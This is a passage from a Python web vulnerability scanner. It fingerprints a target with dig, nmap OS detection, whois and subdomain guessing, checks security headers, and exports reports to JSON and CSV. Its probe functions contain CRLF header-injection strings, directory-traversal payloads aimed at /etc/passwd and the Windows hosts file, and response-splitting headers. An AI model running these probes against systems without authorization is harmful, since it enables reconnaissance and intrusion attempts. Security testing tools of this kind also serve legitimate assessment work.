                            dns_records["A"] = dig_result.stdout.strip().split("\n")
                    except Exception:
                        pass

                    # MX record
                    try:
                        dig_cmd = ["dig", "+short", hostname, "MX"]
                        dig_result = subprocess.run(dig_cmd, capture_output=True, text=True, timeout=10)
                        if dig_result.returncode == 0 and dig_result.stdout.strip():
                            dns_records["MX"] = dig_result.stdout.strip().split("\n")
                    except Exception:
                        pass

                    # NS record
                    try:
                        dig_cmd = ["dig", "+short", hostname, "NS"]
                        dig_result = subprocess.run(dig_cmd, capture_output=True, text=True, timeout=10)
                        if dig_result.returncode == 0 and dig_result.stdout.strip():
                            dns_records["NS"] = dig_result.stdout.strip().split("\n")
                    except Exception:
                        pass

                    # TXT record
                    try:
                        dig_cmd = ["dig", "+short", hostname, "TXT"]
                        dig_result = subprocess.run(dig_cmd, capture_output=True, text=True, timeout=10)
                        if dig_result.returncode == 0 and dig_result.stdout.strip():
                            dns_records["TXT"] = dig_result.stdout.strip().split("\n")
                    except Exception:
                        pass

                    target_info["dns_records"] = dns_records

                except Exception:
                    pass

                # OS Detection using nmap
                try:
                    if target_info["ip_address"] and not target_info["ip_address"].startswith("Unable"):
                        nmap_cmd = ["nmap", "-O", "--osscan-guess", "-T4", target_info["ip_address"]]
                        nmap_result = subprocess.run(nmap_cmd, capture_output=True, text=True, timeout=30)

                        if nmap_result.returncode == 0:
                            nmap_output = nmap_result.stdout

                            # Parse OS information
                            os_lines = [line for line in nmap_output.split("\n") if "OS details:" in line or "Running:" in line]
                            if os_lines:
                                target_info["os_detection"]["detected_os"] = os_lines[0].strip()

                            # Parse open ports
                            port_lines = [line for line in nmap_output.split("\n") if "/tcp" in line and "open" in line]
                            open_ports = []
                            for line in port_lines:
                                try:
                                    port = line.split("/")[0].strip()
                                    service = line.split()[2] if len(line.split()) > 2 else "unknown"
                                    open_ports.append({"port": port, "service": service})
                                except Exception:
                                    continue
                            target_info["ports_open"] = open_ports

                except Exception:
                    pass

                # Server Information
                try:
                    response = requests.get(self.target_url, timeout=10)

                    # Server header
                    if "Server" in response.headers:
                        target_info["server_info"]["server"] = response.headers["Server"]

                    # X-Powered-By header
                    if "X-Powered-By" in response.headers:
                        target_info["server_info"]["powered_by"] = response.headers["X-Powered-By"]

                    # X-AspNet-Version header
                    if "X-AspNet-Version" in response.headers:
                        target_info["server_info"]["aspnet_version"] = response.headers["X-AspNet-Version"]

                    # Technology detection from headers and content
                    technologies = []

                    # Check headers for technologies
                    headers_text = " ".join(response.headers.values()).lower()
                    if "apache" in headers_text:
                        technologies.append("Apache")
                    if "nginx" in headers_text:
                        technologies.append("Nginx")
                    if "iis" in headers_text:
                        technologies.append("IIS")
                    if "php" in headers_text:
                        technologies.append("PHP")
                    if "asp.net" in headers_text:
                        technologies.append("ASP.NET")

                    # Check content for technologies
                    content_text = response.text.lower()
                    if "wordpress" in content_text or "wp-content" in content_text:
                        technologies.append("WordPress")
                    if "drupal" in content_text:
                        technologies.append("Drupal")
                    if "joomla" in content_text:
                        technologies.append("Joomla")
                    if "jquery" in content_text:
                        technologies.append("jQuery")
                    if "bootstrap" in content_text:
                        technologies.append("Bootstrap")
                    if "react" in content_text:
                        technologies.append("React")
                    if "angular" in content_text:
                        technologies.append("Angular")
                    if "vue" in content_text:
                        technologies.append("Vue.js")

                    target_info["technologies"] = list(set(technologies))

                except Exception:
                    pass

                # Whois information
                try:
                    whois_cmd = ["whois", hostname]
                    whois_result = subprocess.run(whois_cmd, capture_output=True, text=True, timeout=15)

                    if whois_result.returncode == 0:
                        whois_output = whois_result.stdout

                        # Parse key whois information
                        whois_info = {}
                        for line in whois_output.split("\n"):
                            if ":" in line:
                                key, value = line.split(":", 1)
                                key = key.strip().lower()
                                value = value.strip()

                                if key in ["registrar", "organization", "country", "created", "updated", "expires"]:
                                    whois_info[key] = value

                        target_info["whois_info"] = whois_info

                except Exception:
                    pass

                # Subdomain enumeration (basic)
                try:
                    common_subdomains = ["www", "mail", "ftp", "admin", "test", "dev", "staging", "api", "blog", "shop"]
                    subdomains = []

                    for subdomain in common_subdomains:
                        test_hostname = f"{subdomain}.{hostname}"
                        try:
                            test_ip = socket.gethostbyname(test_hostname)
                            if test_ip:
                                subdomains.append({"subdomain": test_hostname, "ip": test_ip})
                        except Exception:
                            continue

                    target_info["subdomains"] = subdomains

                except Exception:
                    pass

        except Exception:
            pass

        return target_info

    def analyze_ssl_tls(self):
        """
        Analyze SSL/TLS configuration.

        Returns:
            dict: SSL/TLS analysis results
        """
        ssl_analysis = {"ssl_enabled": False, "certificate_valid": False, "protocols_supported": [], "ciphers_supported": [], "vulnerabilities": []}

        try:
            parsed_url = urlparse(self.target_url)
            if parsed_url.scheme == "https":
                ssl_analysis["ssl_enabled"] = True

                # Basic SSL check using requests
                try:
                    requests.get(self.target_url, timeout=10, verify=True)
                    ssl_analysis["certificate_valid"] = True
                except requests.exceptions.SSLError as e:
                    ssl_analysis["vulnerabilities"].append({"type": "SSL Certificate Error", "severity": "High", "description": str(e)})
                except Exception as e:
                    ssl_analysis["vulnerabilities"].append({"type": "SSL Connection Error", "severity": "Medium", "description": str(e)})

        except Exception:
            pass

        return ssl_analysis

    def analyze_security_headers(self):
        """
        Analyze security headers using both requests and curl.

        Returns:
            dict: Security headers analysis results
        """
        headers_analysis = {"headers_found": {}, "missing_headers": [], "vulnerabilities": [], "curl_analysis": {}}

        try:
            # Use requests for basic header analysis
            response = requests.get(self.target_url, timeout=10)

            # Check for important security headers
            security_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": "DENY or SAMEORIGIN",
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": "max-age=31536000",
                "Content-Security-Policy": "default-src 'self'",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "X-Permitted-Cross-Domain-Policies": "none",
                "Cross-Origin-Embedder-Policy": "require-corp",
                "Cross-Origin-Opener-Policy": "same-origin",
                "Cross-Origin-Resource-Policy": "same-origin",
            }

            for header, expected_value in security_headers.items():
                if header in response.headers:
                    headers_analysis["headers_found"][header] = response.headers[header]
                else:
                    headers_analysis["missing_headers"].append(header)
                    headers_analysis["vulnerabilities"].append(
                        {"type": "Missing Security Header", "severity": "Medium", "header": header, "description": f"Missing {header} header"}
                    )

            # Use curl for additional header analysis
            try:
                curl_cmd = ["curl", "-I", "-s", "-L", "--connect-timeout", "10", self.target_url]
                curl_result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=15)

                if curl_result.returncode == 0:
                    curl_headers = curl_result.stdout
                    headers_analysis["curl_analysis"]["raw_headers"] = curl_headers

                    # Parse curl headers
                    for line in curl_headers.split("\n"):
                        if ":" in line and not line.startswith("HTTP/"):
                            header_name, header_value = line.split(":", 1)
                            header_name = header_name.strip()
                            header_value = header_value.strip()

                            if header_name.lower() in ["server", "x-powered-by", "x-aspnet-version"]:
                                headers_analysis["vulnerabilities"].append(
                                    {
                                        "type": "Information Disclosure",
                                        "severity": "Low",
                                        "header": header_name,
                                        "description": f"Server information disclosed: {header_value}",
                                    }
                                )

                    # Check for HTTP methods
                    try:
                        options_cmd = ["curl", "-X", "OPTIONS", "-I", "-s", "--connect-timeout", "10", self.target_url]
                        options_result = subprocess.run(options_cmd, capture_output=True, text=True, timeout=15)

                        if options_result.returncode == 0:
                            allowed_methods = []
                            for line in options_result.stdout.split("\n"):
                                if "allow:" in line.lower():
                                    allowed_methods = line.split(":", 1)[1].strip().split(",")
                                    allowed_methods = [m.strip().upper() for m in allowed_methods]
                                    break

                            if allowed_methods:
                                headers_analysis["curl_analysis"]["allowed_methods"] = allowed_methods

                                # Check for dangerous methods
                                dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT"]
                                found_dangerous = [m for m in allowed_methods if m in dangerous_methods]

                                if found_dangerous:
                                    headers_analysis["vulnerabilities"].append(
                                        {
                                            "type": "Dangerous HTTP Methods",
                                            "severity": "Medium",
                                            "header": "Allow",
                                            "description": f'Dangerous HTTP methods allowed: {", ".join(found_dangerous)}',
                                        }
                                    )

                        # Additional curl-based vulnerability checks
                        self._perform_curl_vulnerability_checks(headers_analysis)

                    except Exception:
                        pass

            except Exception as e:
                headers_analysis["curl_analysis"]["error"] = str(e)

        except Exception:
            pass

        return headers_analysis

    def _perform_curl_vulnerability_checks(self, headers_analysis):
        """
        Perform additional curl-based vulnerability checks.

        Args:
            headers_analysis (dict): Headers analysis dictionary to update
        """
        try:
            # Check for HTTP header injection vulnerabilities
            injection_payloads = ["CRLF\r\nSet-Cookie: malicious=1", "CRLF\r\nX-Injected: true", "%0d%0aSet-Cookie: malicious=1", "%0d%0aX-Injected: true"]

            for payload in injection_payloads:
                try:
                    # Test header injection via User-Agent
                    curl_cmd = ["curl", "-I", "-s", "-L", "--connect-timeout", "10", "-H", f"User-Agent: {payload}", self.target_url]
                    curl_result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=15)

                    if curl_result.returncode == 0:
                        response_headers = curl_result.stdout.lower()
                        if "set-cookie: malicious=1" in response_headers or "x-injected: true" in response_headers:
                            headers_analysis["vulnerabilities"].append(
                                {
                                    "type": "HTTP Header Injection",
                                    "severity": "High",
                                    "header": "User-Agent",
                                    "description": f"Header injection vulnerability detected with payload: {payload}",
                                }
                            )
                            break

                    time.sleep(random.uniform(0.5, 1))

                except Exception:
                    continue

            # Check for information disclosure via error pages
            try:
                curl_cmd = [
                    "curl",
                    "-s",
                    "-L",
                    "--connect-timeout",
                    "10",
                    "-H",
                    "User-Agent: Mozilla/5.0 (compatible; VulnerabilityScanner/1.0)",
                    f"{self.target_url}/nonexistent-page-12345",
                ]
                curl_result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=15)

                if curl_result.returncode == 0:
                    error_content = curl_result.stdout.lower()

                    # Check for sensitive information in error pages
                    sensitive_patterns = [
                        "mysql",
                        "database",
                        "sql",
                        "connection",
                        "error",
                        "stack trace",
                        "exception",
                        "debug",
                        "internal",
                        "path",
                        "file",
                        "directory",
                        "config",
                        "password",
                    ]

                    for pattern in sensitive_patterns:
                        if pattern in error_content:
                            headers_analysis["vulnerabilities"].append(
                                {
                                    "type": "Information Disclosure",
                                    "severity": "Medium",
                                    "header": "Error Page",
                                    "description": f"Sensitive information disclosed in error page: {pattern}",
                                }
                            )
                            break

            except Exception:
                pass

            # Check for directory traversal attempts
            traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ]

            for payload in traversal_payloads:
                try:
                    curl_cmd = ["curl", "-s", "-L", "--connect-timeout", "10", f"{self.target_url}/{payload}"]
                    curl_result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=15)

                    if curl_result.returncode == 0:
                        response_content = curl_result.stdout.lower()
                        if "root:" in response_content or "administrator:" in response_content:
                            headers_analysis["vulnerabilities"].append(
                                {
                                    "type": "Directory Traversal",
                                    "severity": "High",
                                    "header": "File Access",
                                    "description": f"Directory traversal vulnerability detected with payload: {payload}",
                                }
                            )
                            break

                    time.sleep(random.uniform(0.5, 1))

                except Exception:
                    continue

            # Check for HTTP response splitting
            try:
                curl_cmd = ["curl", "-I", "-s", "-L", "--connect-timeout", "10", "-H", "X-Forwarded-For: 127.0.0.1\r\nSet-Cookie: malicious=1", self.target_url]
                curl_result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=15)

                if curl_result.returncode == 0:
                    response_headers = curl_result.stdout.lower()
                    if "set-cookie: malicious=1" in response_headers:
                        headers_analysis["vulnerabilities"].append(
                            {
                                "type": "HTTP Response Splitting",
                                "severity": "High",
                                "header": "X-Forwarded-For",
                                "description": "HTTP response splitting vulnerability detected",
                            }
                        )

            except Exception:
                pass

        except Exception:
            pass

    def run_comprehensive_scan(self, scan_types=None, deep_scan=False, port_scan=False):
        """
        Run comprehensive vulnerability scan.

        Args:
            scan_types (list): List of scan types to perform
            deep_scan (bool): Enable deep scanning
            port_scan (bool): Enable port scanning

        Returns:
            dict: Scan results
        """
        if scan_types is None:
            scan_types = ["sql", "xss", "headers", "ssl"]

        # Enhanced banner
        print(f"\n{'='*80}")
        print("🌐 CA WEB VULNERABILITY SCANNER")
        print(f"{'='*80}")
        print(f"🎯 Target: {self.target_url}")
        print(f"📋 Scan Types: {', '.join(scan_types).upper()}")
        print(f"🔧 Deep Scan: {'✅ Enabled' if deep_scan else '❌ Disabled'}")
        print(f"🔍 Port Scan: {'✅ Enabled' if port_scan else '❌ Disabled'}")
        print(f"⚙️  Background Mode: {'✅ Enabled' if self.background else '❌ Disabled'}")
        print(f"{'='*80}")

        # Show what will be done
        print("\n📊 SCAN OPERATIONS:")
        if "info" in scan_types:
            print("  🔍 Target Information Gathering:")
            print("     • IP Address Resolution")
            print("     • DNS Records (A, MX, NS, TXT)")
            print("     • OS Detection (nmap)")
            print("     • Open Ports Discovery")
            print("     • Technology Detection")
            print("     • Subdomain Enumeration")
            print("     • Whois Information")

        if "sql" in scan_types:
            print("  🗃️  SQL Injection Testing:")
            print("     • GET Parameter Testing")
            print("     • POST Form Field Testing")
            print("     • Error-based Detection")
            print("     • Union-based Testing")

        if "xss" in scan_types:
            print("  🎭 XSS Vulnerability Testing:")
            print("     • Reflected XSS Detection")
            print("     • GET Parameter Testing")
            print("     • POST Form Field Testing")
            print("     • HTML Encoding Bypass")

        if "directory" in scan_types:
            print("  📁 Directory Enumeration:")
            print("     • Page Link Extraction")
            print("     • Common Directory Testing")
            print("     • Deep Scraping Analysis")
            print("     • Form Discovery")
            print("     • Parameter Extraction")

        if "ssl" in scan_types:
            print("  🔒 SSL/TLS Analysis:")
            print("     • Certificate Validation")
            print("     • Protocol Support Check")
            print("     • Vulnerability Detection")

        if "headers" in scan_types:
            print("  🛡️  Security Headers Analysis:")
            print("     • Missing Security Headers")
            print("     • curl Header Analysis")
            print("     • HTTP Methods Testing")
            print("     • Server Information Disclosure")

        if "recursive" in scan_types or deep_scan:
            print("  🔄 Recursive Path Discovery:")
            print("     • BeautifulSoup Link Extraction")
            print("     • Multi-depth URL Discovery")
            print("     • Recursive Vulnerability Testing")
            print("     • Form and Parameter Discovery")
            print("     • Cross-page Vulnerability Analysis")

        print("\n🚀 Starting scan...")
        print(f"{'='*80}")

        start_time = time.time()

        # Gather target information (OS, IP, DNS, etc.)
        print("[INFO] Gathering target information (OS, IP, DNS, technologies)...")
        target_info = self.gather_target_information()
        self.results["target_information"] = target_info
        print("[INFO] Target information gathered:")
        print(f"  - IP Address: {target_info['ip_address']}")
        print(f"  - DNS Records: {len(target_info['dns_records'])} types")
        print(f"  - Open Ports: {len(target_info['ports_open'])}")
        print(f"  - Technologies: {len(target_info['technologies'])}")
        print(f"  - Subdomains: {len(target_info['subdomains'])}")

        # SQL Injection testing
        if "sql" in scan_types:
            print("[INFO] Testing for SQL injection vulnerabilities...")
            sql_vulns = self.test_sql_injection(self.target_url)
            self.results["vulnerabilities"].extend(sql_vulns)
            print(f"[INFO] Found {len(sql_vulns)} SQL injection vulnerabilities")

        # XSS testing
        if "xss" in scan_types:
            print("[INFO] Testing for XSS vulnerabilities...")
            xss_vulns = self.test_xss_vulnerabilities(self.target_url)
            self.results["vulnerabilities"].extend(xss_vulns)
            print(f"[INFO] Found {len(xss_vulns)} XSS vulnerabilities")

        # Directory enumeration
        if "directory" in scan_types:
            print("[INFO] Enumerating directories and files...")
            directories = self.enumerate_directories(self.target_url)
            self.results["directory_enumeration"] = directories
            print(f"[INFO] Found {len(directories)} directories/files")

            # Deep scrape discovered paths
            if directories:
                print("[INFO] Deep scraping discovered paths for additional information...")
                deep_scrape_results = self.deep_scrape_discovered_paths(directories)
                self.results["deep_scrape_analysis"] = deep_scrape_results
                print("[INFO] Deep scraping found:")
                print(f"  - Additional paths: {len(deep_scrape_results['additional_paths'])}")
                print(f"  - Forms: {len(deep_scrape_results['forms_found'])}")
                print(f"  - Parameters: {len(deep_scrape_results['parameters_found'])}")
                print(f"  - Technologies: {len(deep_scrape_results['technologies_detected'])}")
                print(f"  - Vulnerability indicators: {len(deep_scrape_results['vulnerabilities_found'])}")

        # Recursive path discovery and scanning
        if "recursive" in scan_types or deep_scan:
            print("[INFO] Starting recursive path discovery and vulnerability scanning...")
            recursive_results = self.recursive_path_discovery(self.target_url, max_depth=3)
            self.results["recursive_scan"] = recursive_results

            # Add recursive vulnerabilities to main results
            self.results["vulnerabilities"].extend(recursive_results["vulnerabilities_found"])

            print("[INFO] Recursive scan completed:")
            print(f"  - URLs scanned: {recursive_results['total_urls_scanned']}")
            print(f"  - Max depth: {recursive_results['scan_depth']}")
            print(f"  - New paths: {len(recursive_results['discovered_paths'])}")
            print(f"  - Vulnerabilities: {len(recursive_results['vulnerabilities_found'])}")
            print(f"  - Forms: {len(recursive_results['forms_discovered'])}")
            print(f"  - Parameters: {len(recursive_results['parameters_discovered'])}")

        # SSL/TLS analysis
        if "ssl" in scan_types:
            print("[INFO] Analyzing SSL/TLS configuration...")
            ssl_analysis = self.analyze_ssl_tls()
            self.results["ssl_analysis"] = ssl_analysis
            print(f"[INFO] Found {len(ssl_analysis['vulnerabilities'])} SSL/TLS issues")

        # Security headers analysis
        if "headers" in scan_types:
            print("[INFO] Analyzing security headers...")
            headers_analysis = self.analyze_security_headers()
            self.results["security_headers"] = headers_analysis
            print(f"[INFO] Found {len(headers_analysis['vulnerabilities'])} security header issues")

        # Generate summary
        scan_duration = time.time() - start_time
        deep_scrape_info = self.results.get("deep_scrape_analysis", {})
        target_info = self.results.get("target_information", {})
        recursive_info = self.results.get("recursive_scan", {})

        self.results["summary"] = {
            "total_vulnerabilities": len(self.results["vulnerabilities"]),
            "total_directories": len(self.results["directory_enumeration"]),
            "ssl_vulnerabilities": len(self.results["ssl_analysis"].get("vulnerabilities", [])),
            "header_vulnerabilities": len(self.results["security_headers"].get("vulnerabilities", [])),
            "additional_paths_found": len(deep_scrape_info.get("additional_paths", [])),
            "forms_found": len(deep_scrape_info.get("forms_found", [])),
            "parameters_found": len(deep_scrape_info.get("parameters_found", [])),
            "technologies_detected": len(deep_scrape_info.get("technologies_detected", [])),
            "vulnerability_indicators": len(deep_scrape_info.get("vulnerabilities_found", [])),
            "recursive_urls_scanned": recursive_info.get("total_urls_scanned", 0),
            "recursive_max_depth": recursive_info.get("scan_depth", 0),
            "recursive_paths_discovered": len(recursive_info.get("discovered_paths", [])),
            "recursive_vulnerabilities": len(recursive_info.get("vulnerabilities_found", [])),
            "recursive_forms": len(recursive_info.get("forms_discovered", [])),
            "recursive_parameters": len(recursive_info.get("parameters_discovered", [])),
            "target_ip": target_info.get("ip_address", "Unknown"),
            "dns_records_found": len(target_info.get("dns_records", {})),
            "open_ports_found": len(target_info.get("ports_open", [])),
            "technologies_found": len(target_info.get("technologies", [])),
            "subdomains_found": len(target_info.get("subdomains", [])),
            "scan_duration_seconds": round(scan_duration, 2),
            "scan_types": scan_types,
            "deep_scan": deep_scan,
            "port_scan": port_scan,
        }

        print(f"[INFO] Scan completed in {scan_duration:.2f} seconds")
        print(f"[INFO] Found {len(self.results['vulnerabilities'])} vulnerabilities")
        print(f"[INFO] Found {len(self.results['directory_enumeration'])} directories/files")
        print(f"[INFO] Found {len(self.results['ssl_analysis'].get('vulnerabilities', []))} SSL/TLS issues")
        print(f"[INFO] Found {len(self.results['security_headers'].get('vulnerabilities', []))} security header issues")

        return self.results

    def export_results(self, filename=None, format="json"):
        """
        Export scan results to file.

        Args:
            filename (str): Output filename
            format (str): Export format ('json', 'csv', 'both')

        Returns:
            str: Path to exported file
        """
        if filename is None:
            # Create Web_Scans directory if it doesn't exist
            web_scans_dir = "Web_Scans"
            if not os.path.exists(web_scans_dir):
                os.makedirs(web_scans_dir)

            # Extract target name from URL for naming
            parsed_url = urlparse(self.target_url)
            target_name = parsed_url.hostname or parsed_url.path.replace("/", "_")
            if target_name.startswith("www."):
                target_name = target_name[4:]
            timestamp = datetime.now().strftime("%d-%m")
            base_filename = f"Vuln_{target_name}_{timestamp}"
            output_dir = web_scans_dir
        else:
            # Use provided filename and directory
            output_dir = os.path.dirname(filename)
            if output_dir and not os.path.exists(output_dir):
                os.makedirs(output_dir)
            elif not output_dir:
                output_dir = "."

            base_filename = os.path.basename(filename)
            base_filename = base_filename.rsplit(".", 1)[0] if "." in base_filename else base_filename

        exported_files = []

        try:
            if format in ["json", "both"]:
                json_filename = os.path.join(output_dir, f"{base_filename}.json")
                with open(json_filename, "w") as f:
                    json.dump(self.results, f, indent=2)
                exported_files.append(json_filename)
                print(f"💾 JSON results exported to: {json_filename}")

            if format in ["csv", "both"]:
                csv_filename = os.path.join(output_dir, f"{base_filename}.csv")
                self.export_csv(csv_filename)
                exported_files.append(csv_filename)
                print(f"💾 CSV results exported to: {csv_filename}")

            # Always export both JSON and CSV for comprehensive results
            if format == "json" and len(exported_files) == 1:
                csv_filename = os.path.join(output_dir, f"{base_filename}.csv")
                self.export_csv(csv_filename)
                exported_files.append(csv_filename)
                print(f"💾 CSV results also exported to: {csv_filename}")

            return exported_files[0] if len(exported_files) == 1 else exported_files

        except Exception as e:
            print(f"❌ Error exporting results: {e}")
            return None

    def export_csv(self, filename):
        """
        Export scan results to CSV file with enhanced formatting.

        Args:
            filename (str): Output CSV filename
        """
        try:
            import csv

            with open(filename, "w", newline="", encoding="utf-8") as csvfile:
                writer = csv.writer(csvfile)

                # Write main header
                writer.writerow(["=" * 100])
                writer.writerow(["CA WEB VULNERABILITY SCAN RESULTS"])
                writer.writerow(["=" * 100])
                writer.writerow([])

                # Write scan summary
                writer.writerow(["SCAN SUMMARY"])
                writer.writerow(["-" * 50])
                writer.writerow(["Target URL", self.results["target_url"]])
                writer.writerow(["Scan Timestamp", self.results["scan_timestamp"]])
                writer.writerow(["Scan Duration", f"{self.results['summary']['scan_duration_seconds']} seconds"])
                writer.writerow(["Scan Types", ", ".join(self.results["summary"]["scan_types"]).upper()])
                writer.writerow(["Total Vulnerabilities", self.results["summary"]["total_vulnerabilities"]])
                writer.writerow(["Directories Found", self.results["summary"]["total_directories"]])
                writer.writerow(["SSL/TLS Issues", self.results["summary"]["ssl_vulnerabilities"]])
                writer.writerow(["Header Issues", self.results["summary"]["header_vulnerabilities"]])
                writer.writerow([])

                # Write target information
                target_info = self.results.get("target_information", {})
                if target_info:
                    writer.writerow(["TARGET INFORMATION"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["IP Address", target_info.get("ip_address", "Unknown")])
                    writer.writerow(["DNS Records", target_info.get("dns_records", {})])
                    writer.writerow(["Open Ports", len(target_info.get("ports_open", []))])
                    writer.writerow(["Technologies", ", ".join(target_info.get("technologies", []))])
                    writer.writerow(["Subdomains", len(target_info.get("subdomains", []))])
                    writer.writerow([])

                # Write recursive scan results
                recursive_info = self.results.get("recursive_scan", {})
                if recursive_info and recursive_info.get("total_urls_scanned", 0) > 0:
                    writer.writerow(["RECURSIVE SCAN RESULTS"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["URLs Scanned", recursive_info.get("total_urls_scanned", 0)])
                    writer.writerow(["Max Depth", recursive_info.get("scan_depth", 0)])
                    writer.writerow(["Paths Discovered", len(recursive_info.get("discovered_paths", []))])
                    writer.writerow(["Vulnerabilities Found", len(recursive_info.get("vulnerabilities_found", []))])
                    writer.writerow(["Forms Discovered", len(recursive_info.get("forms_discovered", []))])
                    writer.writerow(["Parameters Discovered", len(recursive_info.get("parameters_discovered", []))])
                    writer.writerow([])

                # Write vulnerabilities section
                if self.results["vulnerabilities"]:
                    writer.writerow(["VULNERABILITIES FOUND"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["Type", "Severity", "Parameter", "Payload", "URL", "Method", "Evidence", "Discovery URL", "Depth"])

                    for vuln in self.results["vulnerabilities"]:
                        writer.writerow(
                            [
                                vuln.get("type", ""),
                                vuln.get("severity", ""),
                                vuln.get("parameter", ""),
                                vuln.get("payload", ""),
                                vuln.get("url", ""),
                                vuln.get("method", ""),
                                vuln.get("evidence", ""),
                                vuln.get("discovered_url", ""),
                                vuln.get("discovery_depth", ""),
                            ]
                        )
                    writer.writerow([])

                # Write detailed payload testing results
                sql_results = self.results.get("sql_injection_results", {})
                if sql_results:
                    writer.writerow(["SQL INJECTION TESTING DETAILS"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["Parameter", "Payload", "Status Code", "Response Length", "Error Detected", "Evidence"])

                    for param, tests in sql_results.items():
                        for test in tests:
                            writer.writerow(
                                [
                                    param,
                                    test.get("payload", ""),
                                    test.get("status_code", ""),
                                    test.get("response_length", ""),
                                    test.get("error_detected", ""),
                                    test.get("evidence", ""),
                                ]
                            )
                    writer.writerow([])

                xss_results = self.results.get("xss_testing_results", {})
                if xss_results:
                    writer.writerow(["XSS TESTING DETAILS"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["Parameter", "Payload", "Status Code", "Response Length", "XSS Detected", "Evidence"])

                    for param, tests in xss_results.items():
                        for test in tests:
                            writer.writerow(
                                [
                                    param,
                                    test.get("payload", ""),
                                    test.get("status_code", ""),
                                    test.get("response_length", ""),
                                    test.get("xss_detected", ""),
                                    test.get("evidence", ""),
                                ]
                            )
                    writer.writerow([])

                # Write directories section
                if self.results["directory_enumeration"]:
                    writer.writerow(["DIRECTORIES AND FILES FOUND"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["Path", "URL", "Status Code", "Size", "Type", "Source"])

                    for directory in self.results["directory_enumeration"]:
                        writer.writerow(
                            [
                                directory.get("path", ""),
                                directory.get("url", ""),
                                directory.get("status_code", ""),
                                directory.get("size", ""),
                                directory.get("type", ""),
                                directory.get("source", ""),
                            ]
                        )
                    writer.writerow([])

                # Write SSL/TLS issues
                ssl_vulns = self.results.get("ssl_analysis", {}).get("vulnerabilities", [])
                if ssl_vulns:
                    writer.writerow(["SSL/TLS ISSUES"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["Type", "Severity", "Description"])

                    for vuln in ssl_vulns:
                        writer.writerow([vuln.get("type", ""), vuln.get("severity", ""), vuln.get("description", "")])
                    writer.writerow([])

                # Write security header issues
                header_vulns = self.results.get("security_headers", {}).get("vulnerabilities", [])
                if header_vulns:
                    writer.writerow(["SECURITY HEADER ISSUES"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["Type", "Severity", "Header", "Description"])

                    for vuln in header_vulns:
                        writer.writerow([vuln.get("type", ""), vuln.get("severity", ""), vuln.get("header", ""), vuln.get("description", "")])
                    writer.writerow([])

                # Write deep scrape results
                deep_scrape = self.results.get("deep_scrape_analysis", {})
                if deep_scrape:
                    writer.writerow(["DEEP SCRAPE ANALYSIS"])
                    writer.writerow(["-" * 50])
                    writer.writerow(["Additional Paths", len(deep_scrape.get("additional_paths", []))])
                    writer.writerow(["Forms Found", len(deep_scrape.get("forms_found", []))])
                    writer.writerow(["Parameters Found", len(deep_scrape.get("parameters_found", []))])
                    writer.writerow(["Technologies Detected", ", ".join(deep_scrape.get("technologies_detected", []))])
                    writer.writerow(["Vulnerability Indicators", len(deep_scrape.get("vulnerabilities_found", []))])
                    writer.writerow([])

                # Write footer
                writer.writerow(["=" * 100])
                writer.writerow(["END OF REPORT"])
                writer.writerow(["Generated by CA Web Vulnerability Scanner"])
                writer.writerow(["=" * 100])

        except Exception as e:
            print(f"❌ Error exporting CSV: {e}")
            return False

    def print_summary(self):
        """
        Print scan summary to console.
        """
        print(f"\n{'='*80}")
        print("🌐 WEB VULNERABILITY SCAN SUMMARY")
        print(f"{'='*80}")
        print(f"Target URL: {self.results['target_url']}")
        print(f"IP Address: {self.results['summary']['target_ip']}")
        print(f"Scan Time: {self.results['scan_timestamp']}")
        print(f"Background Mode: {self.results['background_mode']}")
        print(f"Duration: {self.results['summary']['scan_duration_seconds']} seconds")

        # Target Information Summary
        target_info = self.results.get("target_information", {})
        if target_info:
            print("\n🔍 TARGET INFORMATION:")
            print(f"  DNS Records: {self.results['summary']['dns_records_found']} types")
            print(f"  Open Ports: {self.results['summary']['open_ports_found']}")
            print(f"  Technologies: {self.results['summary']['technologies_found']}")
            print(f"  Subdomains: {self.results['summary']['subdomains_found']}")

            # Show detected technologies
            if target_info.get("technologies"):
                print(f"  Detected Tech: {', '.join(target_info['technologies'])}")

            # Show open ports
            if target_info.get("ports_open"):
                ports_str = ", ".join([f"{p['port']}({p['service']})" for p in target_info["ports_open"][:5]])
                if len(target_info["ports_open"]) > 5:
                    ports_str += f" ... and {len(target_info['ports_open']) - 5} more"
                print(f"  Open Ports: {ports_str}")

            # Show OS detection
            if target_info.get("os_detection", {}).get("detected_os"):
                print(f"  OS Detection: {target_info['os_detection']['detected_os']}")

            # Show server info
            if target_info.get("server_info"):
                server_info = target_info["server_info"]
                if server_info.get("server"):
                    print(f"  Server: {server_info['server']}")
                if server_info.get("powered_by"):
                    print(f"  Powered By: {server_info['powered_by']}")

        print("\n📊 VULNERABILITY SUMMARY:")
        print(f"  Total Vulnerabilities: {self.results['summary']['total_vulnerabilities']}")
        print(f"  Directories Found: {self.results['summary']['total_directories']}")
        print(f"  SSL/TLS Issues: {self.results['summary']['ssl_vulnerabilities']}")
        print(f"  Security Header Issues: {self.results['summary']['header_vulnerabilities']}")

        # Deep scrape summary
        if self.results["summary"]["additional_paths_found"] > 0:
            print("\n🔍 DEEP SCRAPE ANALYSIS:")
            print(f"  Additional Paths: {self.results['summary']['additional_paths_found']}")
            print(f"  Forms Found: {self.results['summary']['forms_found']}")
            print(f"  Parameters Found: {self.results['summary']['parameters_found']}")
            print(f"  Technologies Detected: {self.results['summary']['technologies_detected']}")
            print(f"  Vulnerability Indicators: {self.results['summary']['vulnerability_indicators']}")

        # Recursive scan summary
